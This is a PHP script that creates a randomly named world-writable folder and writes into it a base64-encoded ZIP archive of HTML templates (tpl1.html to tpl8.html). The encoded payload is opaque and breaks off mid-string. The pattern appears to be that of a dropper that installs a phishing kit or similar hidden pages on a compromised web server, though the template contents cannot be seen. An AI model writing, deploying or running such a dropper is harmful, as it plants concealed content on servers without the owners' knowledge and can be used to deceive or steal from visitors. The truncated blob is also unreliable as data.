<?php

$let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    

$myfilename = "z1";

$foldername='';     

for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$foldername .= $let[$r];     
} 

mkdir($foldername, 0777);

$data = base64_decode("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